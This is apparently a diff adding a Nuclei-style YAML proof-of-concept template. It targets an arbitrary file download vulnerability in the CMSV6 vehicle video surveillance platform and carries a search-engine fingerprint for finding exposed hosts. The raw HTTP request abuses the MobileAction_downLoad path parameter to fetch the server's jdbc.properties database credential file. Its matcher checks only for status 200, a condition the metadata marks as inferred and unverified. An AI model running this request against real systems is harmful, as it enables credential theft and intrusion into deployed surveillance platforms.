@@ -1,0 +1,37 @@
+id: poc-3d8cb4a0f15be2239871
+info:
+  name: 通天星CMSV6车载视频监控平台MobileAction_downLoad存在任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3d8cb4a0f15be223987146a66ea25bbc
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 3d8cb4a0f15be223987146a66ea25bbc
+    fofa: + hunter`web.body="./open/webApi.html"`
+http:
+- raw:
+  - 'GET /808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: language=zh; style=1; EnableAESLogin=0; maintitle=%u5317%u6597%u4E3B%u52A8%u5B89%u5168%u4E91%u5E73%u53F0; name=value; JSESSIONID=91A2BB4151F3DCBD654371B8E33B7221
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
